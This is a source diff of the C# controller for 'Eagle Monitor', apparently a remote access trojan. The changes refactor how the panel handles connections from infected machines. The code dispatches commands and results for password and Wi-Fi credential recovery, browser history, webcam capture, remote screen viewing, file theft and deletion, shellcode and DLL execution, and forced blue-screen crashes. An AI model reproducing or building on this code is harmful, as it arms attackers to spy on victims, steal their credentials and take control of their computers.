@@ -6,6 +6,7 @@ using System.Collections.Generic;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using static Shared.Serializer;
@@ -19,12 +20,12 @@ namespace Eagle_Monitor.Clients
 {
     public class Client : IDisposable
     {
-        //public static List<Client> ClientList = new List<Client>();
         public static Dictionary<string, Client>ClientDictionary = new Dictionary<string, Client>();
         public Socket S { get; set; }
         public int Port { get; set; }
         public string IP { get; set; }
         public string HWID { get; set; }
+        public string Username { get; set; }
         public ListViewItem ClientLV;
         public PasswordsForm passwordsForm;
         public HistoryForm historyForm;
@@ -35,13 +36,16 @@ namespace Eagle_Monitor.Clients
         public ExecuteForm executeDllForm;
         public MiscellaneousForm miscellaneousForm;
         public WebCamForm webCamForm;
-        public IPAPI.IP CountryInfo;
+        public InformationForm informationForm;
+        //public IPAPI.IP CountryInfo;
+        public string Country;
     
         public Client(Socket Client)
         {
             this.S = Client;
             this.IP = S.RemoteEndPoint.ToString();
-            Task.Run(() => ReadData());
+            //Task.Run(() => ReadData());
+           new Thread(() => ReadData()).Start();
         }
 
         private void ReadData()
@@ -59,86 +63,89 @@ namespace Eagle_Monitor.Clients
 
                         switch (data.Type)
                         {
-                            case Shared.PacketTypes.PacketType.ID:
+                            case PacketType.ID:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetClient).Invoke(this, data, dataReceived.Length));// DataUtilities.SetClient(this, data, dataReceived.Length));
                                 break;
-                            case Shared.PacketTypes.PacketType.PASSWORDS:
+                            case PacketType.PASSWORDS:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetPasswords).Invoke(this, data, dataReceived.Length));
+                                //new Thread(() => new DataUtilities.SetData(DataUtilities.SetPasswords).Invoke(this, data, dataReceived.Length)).Start();
                                 break;
-                            case Shared.PacketTypes.PacketType.HISTORY:
+                            case PacketType.HISTORY:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetHistory).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case Shared.PacketTypes.PacketType.WIFI:
+                            case PacketType.WIFI:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetWifiPasswords).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case Shared.PacketTypes.PacketType.GET_PROC:
+                            case PacketType.GET_PROC:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetProcess).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.KILL_PROC:
+                            case PacketType.KILL_PROC:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetKilledProc).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.SUSPEND_PROC:
+                            case PacketType.SUSPEND_PROC:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetSuspendedProc).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.RESUME_PROC:
+                            case PacketType.RESUME_PROC:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetResumedProc).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.SET_WND_TEXT:
+                            case PacketType.SET_WND_TEXT:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetTextWindowProc).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.GET_D:
+                            case PacketType.GET_D:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDisks).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.GET_F:
+                            case PacketType.GET_F:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetFilesAndDirs).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.DELETE_F:
+                            case PacketType.DELETE_F:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDeleteFile).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.DOWNLOAD_F:
+                            case PacketType.DOWNLOAD_F:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDownloadFile).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.REMOTE_VIEW:
+                            case PacketType.REMOTE_VIEW:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetRemoteViewer).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.EXEC_MANAGED_DLL:
+                            case PacketType.EXEC_MANAGED_DLL:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetManagedExecution).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.EXEC_SHELL_CODE:
+                            case PacketType.EXEC_SHELL_CODE:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShellCodeExecution).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.GET_CAMERAS:
+                            case PacketType.GET_CAMERAS:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetWebCams).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.CAPTURE_CAMERA:
+                            case PacketType.CAPTURE_CAMERA:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetCapturedWebCam).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.SHORTCUT_DESKTOP:
+                            case PacketType.SHORTCUT_DESKTOP:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.SHORTCUT_DOCUMENTS:
+                            case PacketType.SHORTCUT_DOCUMENTS:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.SHORTCUT_DOWNLOADS:
+                            case PacketType.SHORTCUT_DOWNLOADS:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                 break;
-                            case PacketTypes.PacketType.GET_PRIV:
+                            case PacketType.GET_PRIV:
                                 Task.Run(() => new DataUtilities.SetData(DataUtilities.SetPrivilege).Invoke(this, data, dataReceived.Length));
+                                break;
+                            case PacketType.GET_INFORMATION:
+                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetComputerInformation).Invoke(this, data, dataReceived.Length));
                                 break;
                         }
                     }
                 } 
             }
-            catch (Exception) 
+            catch {}
+
+            try
             {
-            }
-            
-            if (ClientLV != null)
-            {
-                StartForm.M.Invoke((MethodInvoker)(() =>
+                if (ClientLV != null)
                 {
-                    try
+                    Task.Run(() =>
                     {
+
                         Utilities.CloseForm(remoteDesktopForm);
                         Utilities.CloseForm(passwordsForm);
                         Utilities.CloseForm(wifiForm);
@@ -149,14 +156,32 @@ namespace Eagle_Monitor.Clients
                         Utilities.CloseForm(miscellaneousForm);
                         Utilities.CloseForm(webCamForm);
                         StartForm.M.clientsListView.Items.Remove(ClientLV);
-                        ClientDictionary.Remove(this.HWID);                     
-                    }
-                    catch { }
-                    
-                }));
+                        ClientDictionary.Remove(this.HWID);
+                    });
+                } 
             }
+            catch { }
             this.Dispose();
             Shared.Utils.ClearMem();
+            /*  StartForm.M.Invoke((MethodInvoker)(() =>
+              {
+                  try
+                  {
+                      Utilities.CloseForm(remoteDesktopForm);
+                      Utilities.CloseForm(passwordsForm);
+                      Utilities.CloseForm(wifiForm);
+                      Utilities.CloseForm(fileManagerForm);
+                      Utilities.CloseForm(executeDllForm);
+                      Utilities.CloseForm(processManagerForm);
+                      Utilities.CloseForm(historyForm);
+                      Utilities.CloseForm(miscellaneousForm);
+                      Utilities.CloseForm(webCamForm);
+                      StartForm.M.clientsListView.Items.Remove(ClientLV);
+                      ClientDictionary.Remove(this.HWID);                     
+                  }
+                  catch { }
+
+              }));*/
         }
 
         public static void ClientFixer(Client C)
@@ -183,11 +208,10 @@ namespace Eagle_Monitor.Clients
                 }));
             }
         }
-
-        public static void SimplePacketSender(Shared.PacketTypes.PacketType packet, Client C) 
+        public static void SimplePacketSender(PacketType packet, Client C) 
         {
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
@@ -216,11 +240,11 @@ namespace Eagle_Monitor.Clients
                             C.passwordsForm.loadingCircle1.Active = true;
                             C.passwordsForm.passwordsListView.Items.Clear();
                             Data D = new Data();
-                            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                            D.Type = PacketType.PLUGIN;
                             D.Plugin = Plugins.Recovery;
                             D.IP_Origin = C.IP;
                             D.HWID = C.HWID;
-                            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.PASSWORDS };
+                            D.DataReturn = new object[] { PacketType.PASSWORDS };
                             Task.Run(() => C.SendData(D.Serialize()));
                         }
                     }
@@ -241,11 +265,11 @@ namespace Eagle_Monitor.Clients
                             C.wifiForm.loadingCircle1.Active = true;
                             C.wifiForm.wifiPasswordsListView.Items.Clear();
                             Data D = new Data();
-                            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                            D.Type = PacketType.PLUGIN;
                             D.Plugin = Plugins.Recovery;
                             D.IP_Origin = C.IP;
                             D.HWID = C.HWID;
-                            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.WIFI };
+                            D.DataReturn = new object[] { PacketType.WIFI };
                             Task.Run(() => C.SendData(D.Serialize()));
                         }
                     }
@@ -255,11 +279,11 @@ namespace Eagle_Monitor.Clients
                         string[] s = Microsoft.VisualBasic.Strings.Split(I.SubItems[1].Text, "||");
                         byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(s[0]), 1);        
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = PacketType.PLUGIN;
                         D.Plugin = Plugins.Execute;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_MANAGED_DLL, b, s[1], Utilities.SplitPath(s[0]) };
+                        D.DataReturn = new object[] { PacketType.EXEC_MANAGED_DLL, b, s[1], Utilities.SplitPath(s[0]) };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
 
@@ -267,22 +291,22 @@ namespace Eagle_Monitor.Clients
                     {
                         byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(I.SubItems[1].Text), 1);
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = PacketType.PLUGIN;
                         D.Plugin = Plugins.Execute;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(I.SubItems[1].Text) };
+                        D.DataReturn = new object[] { PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(I.SubItems[1].Text) };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
 
                     if (I.Name == "BSOD")
                     {                   
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = PacketType.PLUGIN;
                         D.Plugin = Plugins.Miscellaneous;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.BSOD_SYS };
+                        D.DataReturn = new object[] { PacketType.BSOD_SYS };
                         Task.Run(() => C.SendData(D.Serialize()));
                         Client.ClientFixer(C);
                     }
@@ -332,7 +356,6 @@ namespace Eagle_Monitor.Clients
             }
             return data;
         }
-
         public void CloseClient()
         {
             this.S.Shutdown(System.Net.Sockets.SocketShutdown.Both);
